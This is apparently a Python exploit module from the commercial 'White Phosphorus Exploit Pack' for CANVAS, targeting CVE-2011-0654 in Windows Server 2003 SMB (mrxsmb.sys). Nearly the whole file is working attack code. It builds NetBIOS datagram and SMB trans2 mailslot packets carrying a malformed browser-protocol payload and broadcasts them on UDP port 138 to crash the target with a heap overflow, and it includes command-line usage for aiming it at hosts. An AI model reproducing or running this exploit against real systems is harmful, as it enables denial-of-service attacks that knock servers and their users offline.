
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
import re
from struct import *



# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Microsoft Windows SMB mrxsmb.sys Remote Heap Overflow Dos"
DESCRIPTION = "A heap overflow Dos in Microsoft Windows SMB"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2011-02-14"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']='CVE-2011-0654'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0654'
DOCUMENTATION['CVSS'] = 0.0
DOCUMENTATION["References"] = "http://blogs.technet.com/b/srd/archive/2011/02/16/notes-on-exploitability-of-the-recent-windows-browser-protocol-issue.aspx"
DOCUMENTATION["Notes"] = """
This exploit causes a denial of service condition.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = ["2003"]

NOTES="""
-----------------------------------------------------------------------
WP> Microsoft Windows SMB mrxsmb.sys Remote Heap Overflow Dos
-----------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)
-O domain:<domain>

Versions:
0: Windows 2003

Payloads:
0: TCP Connect Back

Example:
./3rdparty/White_Phosphorus/exploits/wp_microsoft_smb_mrxsmb_sys_dos/wp_microsoft_smb_mrxsmb_sys_dos.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555
"""

PORT = 138
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2003", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["Dos"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.sname = "".join( [ random.choice(string.uppercase) for x in range(8) ] )
        self.dname = 'DOMAIN'.upper() # must be set to the target domain & must be upper case
        
        return

    def usage(self):
        self.wp_usage(targets)
        self.wp_usage(targets,"-O domain:<DOMAIN>")
        return
    
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        if self.version == 0:
            return 0  

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode() 
    def getArgs(self):
        self.shell_TCPCONNECTBACK = True # must be set to populate self.callback.ip

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        if self.argsDict.get("domain_value",'') != '':
            self.dname = self.argsDict.get("domain_value",'').upper() # must be set to the target domain & must be upper case
                
        if self.argsDict.get("domain",'') != '':
            self.dname = self.argsDict.get("domain",'').upper() # must be set to the target domain & must be upper case
                
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
     
    def encodename(self, nbt,service):
        final = '\x20'+''.join([chr((ord(i)>>4) + ord('A'))+chr((ord(i)&0xF) + ord('A')) for i in nbt])+((15 - len(nbt)) * str('\x43\x41'))+service
        return final
     
    def lengthlittle(self, packet,addnum):
        length = struct.pack("<i", len(packet)+addnum)[0:2]
        return length
     
    def lengthbig(self, packet,addnum):
        length = struct.pack(">i", len(packet)+addnum)[2:4]
        return length
     
    def smbheaderudp(self, op="\x25"):
        header = "\xff\x53\x4d\x42"
        header += op
        header += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        return header
    
    def trans2mailslot(self, tid="\x80\x0b",ip="",sname="",dname="",namepipe="\MAILSLOT\BROWSE",srcservice="\x41\x41\x00",dstservice="\x41\x41\x00",pbrowser=""):
        packetbrowser  =  pbrowser                            
        packetmailslot = "\x01\x00\x00\x00\x02\x00"
        packetmailslot += self.lengthlittle(packetbrowser+namepipe,4)
        packetmailslot += namepipe +"\x00"
        packetdatagram = "\x11\x02"
        packetdatagram += tid
        packetdatagram += socket.inet_aton(ip)
        packetdatagram += "\x00\x8a\x00\xa7\x00\x00"
        packetdatagramname = self.encodename(sname,srcservice)
        packetdatagramname+= self.encodename(dname,dstservice)
        smbheader = self.smbheaderudp("\x25")
        packetrans2 = "\x11\x00\x00"
        packetrans2 += self.lengthlittle(packetbrowser,0)
        packetrans2 += "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x00\x00\x00\x00\x00\x00"
        packetrans2 += self.lengthlittle(packetbrowser,0)
        packetrans2 += self.lengthlittle(smbheader+packetrans2+packetmailslot,4)
        packetrans2 += "\x03\x00"
        andoffset = self.lengthlittle(smbheader+packetrans2+packetmailslot,2)
        lengthcalc = packetdatagramname+smbheader+packetrans2+packetmailslot+packetbrowser
        packetfinal = packetdatagram+packetdatagramname+smbheader+packetrans2+packetmailslot+packetbrowser
        packetotalength = list(packetfinal)
        packetotalength[10:12] = self.lengthbig(lengthcalc,0)
        packetrans2final = ''.join(packetotalength)
        return packetrans2final
    
    def makesploit(self):
        payload = "\x08\x09\xa8\x0f\x01\x20\x1b\xe9\xa5\x00\x00\x00\x00\x00"
        payload += wp_randomstring(410)
        payload += "\x00"
        return payload

    def run(self):
        self.getArgs()
        
        self.log ("WP> Crafting exploit packets")
        self.log ("WP> Targetting domain %s" % self.dname)
        
        bcasthost = ''
        i = [m.start() for m in re.finditer(r"\.", self.callback.ip)][2]
        for j in range(0, i+1):
            bcasthost += self.callback.ip[j]
        bcasthost += '255'
        
        #print bcasthost
        self.log ("WP> Targetting broadcast %s" % bcasthost)
        
        payload = self.makesploit()
        sourceservice = "\x41\x41\x00"
        destservice = "\x42\x4f\x00"

        s = self.getudpsock()
        try:
            packsmbheader = self.smbheaderudp("\x25")
            buffer0 = self.trans2mailslot(tid="\x80\x22",ip=self.callback.ip,sname=self.sname,dname=self.dname,namepipe="\MAILSLOT\BROWSER",srcservice=sourceservice, dstservice=destservice, pbrowser=payload)
            self.log("WP> Sending Exploit")
            
            s.connect((bcasthost, self.port))
            s.send(buffer0)
                     
        except:
            self.log("WP> Unable to send broadcast packet")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0 
        
        s.close()   
        ret = 1
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
